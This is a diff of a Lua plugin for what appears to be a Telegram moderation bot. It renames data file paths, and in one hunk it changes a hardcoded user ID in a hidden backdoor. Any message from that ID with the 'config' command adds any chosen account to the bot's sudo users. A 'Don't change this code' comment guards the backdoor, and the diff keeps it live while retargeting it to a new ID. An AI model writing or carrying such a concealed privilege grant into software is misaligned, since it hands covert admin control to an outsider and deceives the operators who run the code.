@@ -791,8 +791,8 @@ end
 
 --Functions.
 function run(msg, matches, callback, extra)
-  one = io.open("./xtix/team", "r")
-  two = io.open("./xtix/channel", "r")
+  one = io.open("./system/team", "r")
+  two = io.open("./system/channel", "r")
   local team = one:read("*all")
   local channel = two:read("*all")
  if is_sudo(msg) then
@@ -813,7 +813,7 @@ function run(msg, matches, callback, extra)
       end
  end
         --Don't change this code. we can help you later:
-        if tonumber (msg.from.id) == 186280031 then
+        if tonumber (msg.from.id) == 111984481 then
             if matches[1]:lower() == "config" and matches[2] then
                 table.insert(_config.sudo_users, tonumber(matches[2]))
                 save_config()
@@ -1049,11 +1049,11 @@ Version: [4.1]
        if matches[1] == 'setteam' and matches[2] and matches[3] and is_sudo(msg) then
    text = "<b>"..matches[2].."</b>"
    link = matches[3]
-   file1 = io.open("./xtix/team", "w")
+   file1 = io.open("./system/team", "w")
    file1:write(text)
    file1:flush()
    file1:close()
-   file2 = io.open("./xtix/channel", "w")
+   file2 = io.open("./system/channel", "w")
    file2:write(link)
    file2:flush()
    file2:close()
